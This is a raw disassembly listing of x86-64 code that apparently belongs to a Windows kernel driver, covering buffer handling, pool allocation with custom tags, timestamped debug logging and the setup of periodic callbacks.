   1400033e1:	74 79                	je     0x14000345c
   1400033e3:	ff 15 df 4d 00 00    	call   *0x4ddf(%rip)        # 0x1400081c8
   1400033e9:	84 c0                	test   %al,%al
   1400033eb:	74 6f                	je     0x14000345c
   1400033ed:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   1400033f1:	e8 06 fa ff ff       	call   0x140002dfc
   1400033f6:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   1400033fa:	45 8b ce             	mov    %r14d,%r9d
   1400033fd:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
   140003404:	00 
   140003405:	44 8b c5             	mov    %ebp,%r8d
   140003408:	48 8b 47 08          	mov    0x8(%rdi),%rax
   14000340c:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   140003411:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140003417:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   14000341d:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140003423:	48 8b 00             	mov    (%rax),%rax
   140003426:	48 8b 0f             	mov    (%rdi),%rcx
   140003429:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   14000342e:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003433:	33 d2                	xor    %edx,%edx
   140003435:	ff 15 2d 4f 00 00    	call   *0x4f2d(%rip)        # 0x140008368
   14000343b:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   140003442:	00 
   140003443:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   14000344a:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   14000344e:	e8 ed f9 ff ff       	call   0x140002e40
   140003453:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   14000345a:	eb 05                	jmp    0x140003461
   14000345c:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140003461:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   140003466:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   14000346a:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   14000346e:	49 8b e3             	mov    %r11,%rsp
   140003471:	41 5e                	pop    %r14
   140003473:	5f                   	pop    %rdi
   140003474:	5e                   	pop    %rsi
   140003475:	c3                   	ret
   140003476:	cc                   	int3
   140003477:	cc                   	int3
   140003478:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000347d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003482:	57                   	push   %rdi
   140003483:	48 83 ec 20          	sub    $0x20,%rsp
   140003487:	48 8b f2             	mov    %rdx,%rsi
   14000348a:	48 8b d9             	mov    %rcx,%rbx
   14000348d:	48 85 d2             	test   %rdx,%rdx
   140003490:	74 60                	je     0x1400034f2
   140003492:	45 85 c0             	test   %r8d,%r8d
   140003495:	74 5b                	je     0x1400034f2
   140003497:	4c 8b 09             	mov    (%rcx),%r9
   14000349a:	4d 85 c9             	test   %r9,%r9
   14000349d:	74 53                	je     0x1400034f2
   14000349f:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   1400034a3:	48 85 d2             	test   %rdx,%rdx
   1400034a6:	74 4a                	je     0x1400034f2
   1400034a8:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1400034ac:	49 63 f8             	movslq %r8d,%rdi
   1400034af:	48 8d 04 39          	lea    (%rcx,%rdi,1),%rax
   1400034b3:	48 3b c2             	cmp    %rdx,%rax
   1400034b6:	76 24                	jbe    0x1400034dc
   1400034b8:	48 8d 14 51          	lea    (%rcx,%rdx,2),%rdx
   1400034bc:	48 8b cb             	mov    %rbx,%rcx
   1400034bf:	e8 a0 00 00 00       	call   0x140003564
   1400034c4:	84 c0                	test   %al,%al
   1400034c6:	74 2a                	je     0x1400034f2
   1400034c8:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400034cc:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   1400034d0:	48 8d 04 39          	lea    (%rcx,%rdi,1),%rax
   1400034d4:	48 3b c2             	cmp    %rdx,%rax
   1400034d7:	77 df                	ja     0x1400034b8
   1400034d9:	4c 8b 0b             	mov    (%rbx),%r9
   1400034dc:	49 03 c9             	add    %r9,%rcx
   1400034df:	4c 8b c7             	mov    %rdi,%r8
   1400034e2:	48 8b d6             	mov    %rsi,%rdx
   1400034e5:	e8 56 3d 00 00       	call   0x140007240
   1400034ea:	48 01 7b 08          	add    %rdi,0x8(%rbx)
   1400034ee:	b0 01                	mov    $0x1,%al
   1400034f0:	eb 02                	jmp    0x1400034f4
   1400034f2:	32 c0                	xor    %al,%al
   1400034f4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400034f9:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400034fe:	48 83 c4 20          	add    $0x20,%rsp
   140003502:	5f                   	pop    %rdi
   140003503:	c3                   	ret
   140003504:	48 8b 01             	mov    (%rcx),%rax
   140003507:	c3                   	ret
   140003508:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   14000350d:	48 83 61 08 00       	andq   $0x0,0x8(%rcx)
   140003512:	48 8b 39             	mov    (%rcx),%rdi
   140003515:	48 85 ff             	test   %rdi,%rdi
   140003518:	74 11                	je     0x14000352b
   14000351a:	48 83 79 10 00       	cmpq   $0x0,0x10(%rcx)
   14000351f:	76 0a                	jbe    0x14000352b
   140003521:	33 c0                	xor    %eax,%eax
   140003523:	33 c9                	xor    %ecx,%ecx
   140003525:	f3 aa                	rep stos %al,(%rdi)
   140003527:	b0 01                	mov    $0x1,%al
   140003529:	eb 02                	jmp    0x14000352d
   14000352b:	32 c0                	xor    %al,%al
   14000352d:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   140003532:	c3                   	ret
   140003533:	cc                   	int3
   140003534:	40 53                	rex push %rbx
   140003536:	48 83 ec 20          	sub    $0x20,%rsp
   14000353a:	48 8b d9             	mov    %rcx,%rbx
   14000353d:	48 8b 09             	mov    (%rcx),%rcx
   140003540:	48 85 c9             	test   %rcx,%rcx
   140003543:	74 0b                	je     0x140003550
   140003545:	ba 57 45 4e 45       	mov    $0x454e4557,%edx
   14000354a:	ff 15 b8 4d 00 00    	call   *0x4db8(%rip)        # 0x140008308
   140003550:	48 83 63 10 00       	andq   $0x0,0x10(%rbx)
   140003555:	48 83 63 08 00       	andq   $0x0,0x8(%rbx)
   14000355a:	48 83 23 00          	andq   $0x0,(%rbx)
   14000355e:	48 83 c4 20          	add    $0x20,%rsp
   140003562:	5b                   	pop    %rbx
   140003563:	c3                   	ret
   140003564:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003569:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000356e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003573:	57                   	push   %rdi
   140003574:	48 83 ec 20          	sub    $0x20,%rsp
   140003578:	48 8b 01             	mov    (%rcx),%rax
   14000357b:	33 f6                	xor    %esi,%esi
   14000357d:	33 ed                	xor    %ebp,%ebp
   14000357f:	48 8b d9             	mov    %rcx,%rbx
   140003582:	48 85 c0             	test   %rax,%rax
   140003585:	74 07                	je     0x14000358e
   140003587:	48 8b 69 08          	mov    0x8(%rcx),%rbp
   14000358b:	48 8b f0             	mov    %rax,%rsi
   14000358e:	48 83 61 08 00       	andq   $0x0,0x8(%rcx)
   140003593:	41 b8 57 45 4e 45    	mov    $0x454e4557,%r8d
   140003599:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   14000359d:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400035a2:	ff 15 68 4d 00 00    	call   *0x4d68(%rip)        # 0x140008310
   1400035a8:	48 89 03             	mov    %rax,(%rbx)
   1400035ab:	48 85 c0             	test   %rax,%rax
   1400035ae:	74 24                	je     0x1400035d4
   1400035b0:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   1400035b4:	48 8b f8             	mov    %rax,%rdi
   1400035b7:	33 c0                	xor    %eax,%eax
   1400035b9:	f3 aa                	rep stos %al,(%rdi)
   1400035bb:	48 85 f6             	test   %rsi,%rsi
   1400035be:	74 27                	je     0x1400035e7
   1400035c0:	48 8b 0b             	mov    (%rbx),%rcx
   1400035c3:	4c 8b c5             	mov    %rbp,%r8
   1400035c6:	48 8b d6             	mov    %rsi,%rdx
   1400035c9:	e8 72 3c 00 00       	call   0x140007240
   1400035ce:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   1400035d2:	eb 05                	jmp    0x1400035d9
   1400035d4:	48 85 f6             	test   %rsi,%rsi
   1400035d7:	74 0e                	je     0x1400035e7
   1400035d9:	ba 57 45 4e 45       	mov    $0x454e4557,%edx
   1400035de:	48 8b ce             	mov    %rsi,%rcx
   1400035e1:	ff 15 21 4d 00 00    	call   *0x4d21(%rip)        # 0x140008308
   1400035e7:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   1400035eb:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400035f0:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400035f5:	0f 95 c0             	setne  %al
   1400035f8:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400035fd:	48 83 c4 20          	add    $0x20,%rsp
   140003601:	5f                   	pop    %rdi
   140003602:	c3                   	ret
   140003603:	cc                   	int3
   140003604:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140003608:	c3                   	ret
   140003609:	cc                   	int3
   14000360a:	cc                   	int3
   14000360b:	cc                   	int3
   14000360c:	40 53                	rex push %rbx
   14000360e:	48 83 ec 20          	sub    $0x20,%rsp
   140003612:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   140003617:	48 8b d9             	mov    %rcx,%rbx
   14000361a:	74 08                	je     0x140003624
   14000361c:	48 8b 01             	mov    (%rcx),%rax
   14000361f:	48 85 c0             	test   %rax,%rax
   140003622:	75 2d                	jne    0x140003651
   140003624:	48 83 c4 20          	add    $0x20,%rsp
   140003628:	5b                   	pop    %rbx
   140003629:	c3                   	ret
   14000362a:	48 39 58 08          	cmp    %rbx,0x8(%rax)
   14000362e:	75 28                	jne    0x140003658
   140003630:	48 8b 08             	mov    (%rax),%rcx
   140003633:	48 39 41 08          	cmp    %rax,0x8(%rcx)
   140003637:	75 1f                	jne    0x140003658
   140003639:	48 89 0b             	mov    %rcx,(%rbx)
   14000363c:	ba 54 4c 58 45       	mov    $0x45584c54,%edx
   140003641:	48 89 59 08          	mov    %rbx,0x8(%rcx)
   140003645:	48 8b c8             	mov    %rax,%rcx
   140003648:	ff 15 ba 4c 00 00    	call   *0x4cba(%rip)        # 0x140008308
   14000364e:	48 8b 03             	mov    (%rbx),%rax
   140003651:	48 3b c3             	cmp    %rbx,%rax
   140003654:	75 d4                	jne    0x14000362a
   140003656:	eb cc                	jmp    0x140003624
   140003658:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000365d:	cd 29                	int    $0x29
   14000365f:	cc                   	int3
   140003660:	48 85 c9             	test   %rcx,%rcx
   140003663:	74 07                	je     0x14000366c
   140003665:	48 89 49 08          	mov    %rcx,0x8(%rcx)
   140003669:	48 89 09             	mov    %rcx,(%rcx)
   14000366c:	c3                   	ret
   14000366d:	cc                   	int3
   14000366e:	cc                   	int3
   14000366f:	cc                   	int3
   140003670:	40 53                	rex push %rbx
   140003672:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140003679:	48 8b 05 60 6a 00 00 	mov    0x6a60(%rip),%rax        # 0x14000a0e0
   140003680:	48 33 c4             	xor    %rsp,%rax
   140003683:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140003688:	48 8b d9             	mov    %rcx,%rbx
   14000368b:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140003690:	48 b8 14 00 00 00 80 	movabs $0xfffff78000000014,%rax
   140003697:	f7 ff ff 
   14000369a:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000369f:	48 8b 00             	mov    (%rax),%rax
   1400036a2:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400036a7:	ff 15 23 4b 00 00    	call   *0x4b23(%rip)        # 0x1400081d0
   1400036ad:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400036b2:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400036b7:	ff 15 93 4c 00 00    	call   *0x4c93(%rip)        # 0x140008350
   1400036bd:	0f bf 54 24 68       	movswl 0x68(%rsp),%edx
   1400036c2:	33 c0                	xor    %eax,%eax
   1400036c4:	44 0f bf 44 24 66    	movswl 0x66(%rsp),%r8d
   1400036ca:	48 8b cb             	mov    %rbx,%rcx
   1400036cd:	44 0f bf 54 24 64    	movswl 0x64(%rsp),%r10d
   1400036d3:	44 0f bf 5c 24 62    	movswl 0x62(%rsp),%r11d
   1400036d9:	44 0f bf 4c 24 60    	movswl 0x60(%rsp),%r9d
   1400036df:	48 89 03             	mov    %rax,(%rbx)
   1400036e2:	0f bf 44 24 6a       	movswl 0x6a(%rsp),%eax
   1400036e7:	89 44 24 40          	mov    %eax,0x40(%rsp)
   1400036eb:	89 54 24 38          	mov    %edx,0x38(%rsp)
   1400036ef:	ba 20 00 00 00       	mov    $0x20,%edx
   1400036f4:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   1400036f9:	4c 8d 05 40 3e 00 00 	lea    0x3e40(%rip),%r8        # 0x140007540
   140003700:	44 89 54 24 28       	mov    %r10d,0x28(%rsp)
   140003705:	44 89 5c 24 20       	mov    %r11d,0x20(%rsp)
   14000370a:	e8 19 00 00 00       	call   0x140003728
   14000370f:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140003714:	48 33 cc             	xor    %rsp,%rcx
   140003717:	e8 14 39 00 00       	call   0x140007030
   14000371c:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140003723:	5b                   	pop    %rbx
   140003724:	c3                   	ret
   140003725:	cc                   	int3
   140003726:	cc                   	int3
   140003727:	cc                   	int3
   140003728:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000372d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140003732:	53                   	push   %rbx
   140003733:	56                   	push   %rsi
   140003734:	57                   	push   %rdi
   140003735:	41 56                	push   %r14
   140003737:	48 83 ec 28          	sub    $0x28,%rsp
   14000373b:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000373f:	33 db                	xor    %ebx,%ebx
   140003741:	4c 8b f1             	mov    %rcx,%r14
   140003744:	48 3d fe ff ff 7f    	cmp    $0x7ffffffe,%rax
   14000374a:	76 0f                	jbe    0x14000375b
   14000374c:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
   140003751:	48 85 d2             	test   %rdx,%rdx
   140003754:	74 31                	je     0x140003787
   140003756:	66 89 19             	mov    %bx,(%rcx)
   140003759:	eb 2c                	jmp    0x140003787
   14000375b:	48 8d 72 ff          	lea    -0x1(%rdx),%rsi
   14000375f:	8b fb                	mov    %ebx,%edi
   140003761:	48 8b d6             	mov    %rsi,%rdx
   140003764:	4c 8d 4c 24 68       	lea    0x68(%rsp),%r9
   140003769:	e8 7a 38 00 00       	call   0x140006fe8
   14000376e:	85 c0                	test   %eax,%eax
   140003770:	78 0b                	js     0x14000377d
   140003772:	48 98                	cltq
   140003774:	48 3b c6             	cmp    %rsi,%rax
   140003777:	77 04                	ja     0x14000377d
   140003779:	75 0c                	jne    0x140003787
   14000377b:	eb 05                	jmp    0x140003782
   14000377d:	bf 05 00 00 80       	mov    $0x80000005,%edi
   140003782:	66 41 89 1c 76       	mov    %bx,(%r14,%rsi,2)
   140003787:	8b c7                	mov    %edi,%eax
   140003789:	48 83 c4 28          	add    $0x28,%rsp
   14000378d:	41 5e                	pop    %r14
   14000378f:	5f                   	pop    %rdi
   140003790:	5e                   	pop    %rsi
   140003791:	5b                   	pop    %rbx
   140003792:	c3                   	ret
   140003793:	cc                   	int3
   140003794:	48 89 15 25 aa 00 00 	mov    %rdx,0xaa25(%rip)        # 0x14000e1c0
   14000379b:	88 0d 27 aa 00 00    	mov    %cl,0xaa27(%rip)        # 0x14000e1c8
   1400037a1:	44 88 05 21 aa 00 00 	mov    %r8b,0xaa21(%rip)        # 0x14000e1c9
   1400037a8:	44 88 0d 1b aa 00 00 	mov    %r9b,0xaa1b(%rip)        # 0x14000e1ca
   1400037af:	c3                   	ret
   1400037b0:	48 8b c4             	mov    %rsp,%rax
   1400037b3:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1400037b7:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400037bb:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1400037bf:	4c 89 48 20          	mov    %r9,0x20(%rax)
   1400037c3:	55                   	push   %rbp
   1400037c4:	53                   	push   %rbx
   1400037c5:	48 8d 68 e8          	lea    -0x18(%rax),%rbp
   1400037c9:	48 81 ec 08 01 00 00 	sub    $0x108,%rsp
   1400037d0:	48 8b 05 09 69 00 00 	mov    0x6909(%rip),%rax        # 0x14000a0e0
   1400037d7:	48 33 c4             	xor    %rsp,%rax
   1400037da:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400037de:	48 8b d9             	mov    %rcx,%rbx
   1400037e1:	33 d2                	xor    %edx,%edx
   1400037e3:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400037e8:	41 b8 80 00 00 00    	mov    $0x80,%r8d
   1400037ee:	e8 4d 39 00 00       	call   0x140007140
   1400037f3:	33 d2                	xor    %edx,%edx
   1400037f5:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400037fa:	44 8d 42 40          	lea    0x40(%rdx),%r8d
   1400037fe:	e8 3d 39 00 00       	call   0x140007140
   140003803:	44 0f 20 c0          	mov    %cr8,%rax
   140003807:	84 c0                	test   %al,%al
   140003809:	0f 85 e3 00 00 00    	jne    0x1400038f2
   14000380f:	48 85 db             	test   %rbx,%rbx
   140003812:	0f 84 da 00 00 00    	je     0x1400038f2
   140003818:	38 05 ab a9 00 00    	cmp    %al,0xa9ab(%rip)        # 0x14000e1c9
   14000381e:	0f 84 ce 00 00 00    	je     0x1400038f2
   140003824:	4c 8b 05 95 a9 00 00 	mov    0xa995(%rip),%r8        # 0x14000e1c0
   14000382b:	4d 85 c0             	test   %r8,%r8
   14000382e:	74 3a                	je     0x14000386a
   140003830:	38 05 92 a9 00 00    	cmp    %al,0xa992(%rip)        # 0x14000e1c8
   140003836:	74 29                	je     0x140003861
   140003838:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000383d:	e8 2e fe ff ff       	call   0x140003670
   140003842:	4c 8b 05 77 a9 00 00 	mov    0xa977(%rip),%r8        # 0x14000e1c0
   140003849:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000384e:	48 8d 15 2b 3d 00 00 	lea    0x3d2b(%rip),%rdx        # 0x140007580
   140003855:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000385a:	e8 83 37 00 00       	call   0x140006fe2
   14000385f:	eb 32                	jmp    0x140003893
   140003861:	48 8d 15 28 3d 00 00 	lea    0x3d28(%rip),%rdx        # 0x140007590
   140003868:	eb 1f                	jmp    0x140003889
   14000386a:	80 3d 57 a9 00 00 00 	cmpb   $0x0,0xa957(%rip)        # 0x14000e1c8
   140003871:	74 24                	je     0x140003897
   140003873:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003878:	e8 f3 fd ff ff       	call   0x140003670
   14000387d:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140003882:	48 8d 15 17 3d 00 00 	lea    0x3d17(%rip),%rdx        # 0x1400075a0
   140003889:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000388e:	e8 4f 37 00 00       	call   0x140006fe2
   140003893:	48 8b 5d 20          	mov    0x20(%rbp),%rbx
   140003897:	48 83 3d 21 a9 00 00 	cmpq   $0x0,0xa921(%rip)        # 0x14000e1c0
   14000389e:	00 
   14000389f:	4c 8d 4d 28          	lea    0x28(%rbp),%r9
   1400038a3:	74 1e                	je     0x1400038c3
   1400038a5:	ba 4d 00 00 00       	mov    $0x4d,%edx
   1400038aa:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400038af:	4c 8b cb             	mov    %rbx,%r9
   1400038b2:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400038b7:	44 8d 42 b5          	lea    -0x4b(%rdx),%r8d
   1400038bb:	ff 15 ff 48 00 00    	call   *0x48ff(%rip)        # 0x1400081c0
   1400038c1:	eb 11                	jmp    0x1400038d4
   1400038c3:	ba 02 00 00 00       	mov    $0x2,%edx
   1400038c8:	4c 8b c3             	mov    %rbx,%r8
   1400038cb:	8d 4a 4b             	lea    0x4b(%rdx),%ecx
   1400038ce:	ff 15 e4 48 00 00    	call   *0x48e4(%rip)        # 0x1400081b8
   1400038d4:	80 3d ef a8 00 00 00 	cmpb   $0x0,0xa8ef(%rip)        # 0x14000e1ca
   1400038db:	74 15                	je     0x1400038f2
   1400038dd:	ba 02 00 00 00       	mov    $0x2,%edx
   1400038e2:	4c 8d 05 c7 3c 00 00 	lea    0x3cc7(%rip),%r8        # 0x1400075b0
   1400038e9:	8d 4a 4b             	lea    0x4b(%rdx),%ecx
   1400038ec:	ff 15 be 48 00 00    	call   *0x48be(%rip)        # 0x1400081b0
   1400038f2:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   1400038f6:	48 33 cc             	xor    %rsp,%rcx
   1400038f9:	e8 32 37 00 00       	call   0x140007030
   1400038fe:	48 81 c4 08 01 00 00 	add    $0x108,%rsp
   140003905:	5b                   	pop    %rbx
   140003906:	5d                   	pop    %rbp
   140003907:	c3                   	ret
   140003908:	cc                   	int3
   140003909:	cc                   	int3
   14000390a:	cc                   	int3
   14000390b:	cc                   	int3
   14000390c:	cc                   	int3
   14000390d:	cc                   	int3
   14000390e:	cc                   	int3
   14000390f:	cc                   	int3
   140003910:	48 83 ec 28          	sub    $0x28,%rsp
   140003914:	e8 0f 01 00 00       	call   0x140003a28
   140003919:	48 83 c4 28          	add    $0x28,%rsp
   14000391d:	e9 02 00 00 00       	jmp    0x140003924
   140003922:	cc                   	int3
   140003923:	cc                   	int3
   140003924:	48 83 ec 28          	sub    $0x28,%rsp
   140003928:	e8 87 1d 00 00       	call   0x1400056b4
   14000392d:	e8 b6 1e 00 00       	call   0x1400057e8
   140003932:	e8 b1 10 00 00       	call   0x1400049e8
   140003937:	e8 d4 eb ff ff       	call   0x140002510
   14000393c:	80 3d 01 cd 00 00 00 	cmpb   $0x0,0xcd01(%rip)        # 0x140010644
   140003943:	74 0c                	je     0x140003951
   140003945:	e8 fe 19 00 00       	call   0x140005348
   14000394a:	c6 05 f3 cc 00 00 00 	movb   $0x0,0xccf3(%rip)        # 0x140010644
   140003951:	48 83 c4 28          	add    $0x28,%rsp
   140003955:	e9 22 df ff ff       	jmp    0x14000187c
   14000395a:	cc                   	int3
   14000395b:	cc                   	int3
   14000395c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003961:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003966:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000396b:	57                   	push   %rdi
   14000396c:	48 83 ec 20          	sub    $0x20,%rsp
   140003970:	48 8b f2             	mov    %rdx,%rsi
   140003973:	48 8b f9             	mov    %rcx,%rdi
   140003976:	33 db                	xor    %ebx,%ebx
   140003978:	48 8d 15 41 3c 00 00 	lea    0x3c41(%rip),%rdx        # 0x1400075c0
   14000397f:	33 c9                	xor    %ecx,%ecx
   140003981:	8d 6b 01             	lea    0x1(%rbx),%ebp
   140003984:	44 8a cd             	mov    %bpl,%r9b
   140003987:	44 8a c5             	mov    %bpl,%r8b
   14000398a:	e8 05 fe ff ff       	call   0x140003794
   14000398f:	e8 28 f2 ff ff       	call   0x140002bbc
   140003994:	84 c0                	test   %al,%al
   140003996:	74 76                	je     0x140003a0e
   140003998:	48 8d 15 31 3c 00 00 	lea    0x3c31(%rip),%rdx        # 0x1400075d0
   14000399f:	48 8d 0d 4a 3c 00 00 	lea    0x3c4a(%rip),%rcx        # 0x1400075f0
   1400039a6:	e8 a1 e3 ff ff       	call   0x140001d4c
   1400039ab:	4c 8d 05 5e ff ff ff 	lea    -0xa2(%rip),%r8        # 0x140003910
   1400039b2:	48 8b d6             	mov    %rsi,%rdx
   1400039b5:	48 8b cf             	mov    %rdi,%rcx
   1400039b8:	e8 8f de ff ff       	call   0x14000184c
   1400039bd:	84 c0                	test   %al,%al
   1400039bf:	74 4d                	je     0x140003a0e
   1400039c1:	e8 e6 e1 ff ff       	call   0x140001bac
   1400039c6:	48 8b c8             	mov    %rax,%rcx
   1400039c9:	e8 b6 18 00 00       	call   0x140005284
   1400039ce:	85 c0                	test   %eax,%eax
   1400039d0:	0f 99 05 6d cc 00 00 	setns  0xcc6d(%rip)        # 0x140010644
   1400039d7:	85 c0                	test   %eax,%eax
   1400039d9:	78 33                	js     0x140003a0e
   1400039db:	48 8b cf             	mov    %rdi,%rcx
   1400039de:	e8 2d 10 00 00       	call   0x140004a10
   1400039e3:	84 c0                	test   %al,%al
   1400039e5:	74 27                	je     0x140003a0e
   1400039e7:	48 8d 0d ea a7 00 00 	lea    0xa7ea(%rip),%rcx        # 0x14000e1d8
   1400039ee:	e8 81 2e 00 00       	call   0x140006874
   1400039f3:	48 8d 15 76 00 00 00 	lea    0x76(%rip),%rdx        # 0x140003a70
   1400039fa:	48 8d 0d ef a7 00 00 	lea    0xa7ef(%rip),%rcx        # 0x14000e1f0
   140003a01:	e8 42 2b 00 00       	call   0x140006548
   140003a06:	84 c0                	test   %al,%al
   140003a08:	0f b6 db             	movzbl %bl,%ebx
   140003a0b:	0f 45 dd             	cmovne %ebp,%ebx
   140003a0e:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003a13:	8a c3                	mov    %bl,%al
   140003a15:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003a1a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003a1f:	48 83 c4 20          	add    $0x20,%rsp
   140003a23:	5f                   	pop    %rdi
   140003a24:	c3                   	ret
   140003a25:	cc                   	int3
   140003a26:	cc                   	int3
   140003a27:	cc                   	int3
   140003a28:	48 83 ec 28          	sub    $0x28,%rsp
   140003a2c:	48 83 3d bc a7 00 00 	cmpq   $0x0,0xa7bc(%rip)        # 0x14000e1f0
   140003a33:	00 
   140003a34:	c6 05 95 a7 00 00 01 	movb   $0x1,0xa795(%rip)        # 0x14000e1d0
   140003a3b:	74 23                	je     0x140003a60
   140003a3d:	48 8d 0d 94 a7 00 00 	lea    0xa794(%rip),%rcx        # 0x14000e1d8
   140003a44:	e8 73 34 00 00       	call   0x140006ebc
   140003a49:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   140003a4e:	e8 c9 2e 00 00       	call   0x14000691c
   140003a53:	48 8b 0d 96 a7 00 00 	mov    0xa796(%rip),%rcx        # 0x14000e1f0
   140003a5a:	ff 15 e8 46 00 00    	call   *0x46e8(%rip)        # 0x140008148
   140003a60:	48 83 c4 28          	add    $0x28,%rsp
   140003a64:	c3                   	ret
   140003a65:	cc                   	int3
   140003a66:	cc                   	int3
   140003a67:	cc                   	int3
   140003a68:	cc                   	int3
   140003a69:	cc                   	int3
   140003a6a:	cc                   	int3
   140003a6b:	cc                   	int3
   140003a6c:	cc                   	int3
   140003a6d:	cc                   	int3
   140003a6e:	cc                   	int3
   140003a6f:	cc                   	int3
   140003a70:	48 83 ec 28          	sub    $0x28,%rsp
   140003a74:	ff 15 6e 47 00 00    	call   *0x476e(%rip)        # 0x1400081e8
   140003a7a:	65 48 8b 0c 25 88 01 	mov    %gs:0x188,%rcx
   140003a81:	00 00 
   140003a83:	ba 05 00 00 00       	mov    $0x5,%edx
   140003a88:	ff 15 72 47 00 00    	call   *0x4772(%rip)        # 0x140008200
   140003a8e:	65 48 8b 0c 25 88 01 	mov    %gs:0x188,%rcx
   140003a95:	00 00 
   140003a97:	e8 d8 0f 00 00       	call   0x140004a74
   140003a9c:	e8 1f 1c 00 00       	call   0x1400056c0
   140003aa1:	41 b0 01             	mov    $0x1,%r8b
   140003aa4:	48 8d 0d 45 01 00 00 	lea    0x145(%rip),%rcx        # 0x140003bf0
   140003aab:	ba 0a 00 00 00       	mov    $0xa,%edx
   140003ab0:	e8 c3 1b 00 00       	call   0x140005678
   140003ab5:	41 b0 01             	mov    $0x1,%r8b
   140003ab8:	48 8d 0d 51 01 00 00 	lea    0x151(%rip),%rcx        # 0x140003c10
   140003abf:	ba 3c 00 00 00       	mov    $0x3c,%edx
   140003ac4:	e8 af 1b 00 00       	call   0x140005678
   140003ac9:	41 b0 01             	mov    $0x1,%r8b
   140003acc:	48 8d 0d bd 00 00 00 	lea    0xbd(%rip),%rcx        # 0x140003b90
   140003ad3:	ba 08 07 00 00       	mov    $0x708,%edx
   140003ad8:	e8 9b 1b 00 00       	call   0x140005678
   140003add:	41 b0 01             	mov    $0x1,%r8b
   140003ae0:	48 8d 0d 99 00 00 00 	lea    0x99(%rip),%rcx        # 0x140003b80
   140003ae7:	ba 08 07 00 00       	mov    $0x708,%edx
   140003aec:	e8 87 1b 00 00       	call   0x140005678
   140003af1:	41 b0 01             	mov    $0x1,%r8b
   140003af4:	48 8d 0d d5 00 00 00 	lea    0xd5(%rip),%rcx        # 0x140003bd0
   140003afb:	ba 08 07 00 00       	mov    $0x708,%edx
   140003b00:	e8 73 1b 00 00       	call   0x140005678
   140003b05:	48 8d 0d fc 49 00 00 	lea    0x49fc(%rip),%rcx        # 0x140008508
   140003b0c:	e8 87 1d 00 00       	call   0x140005898
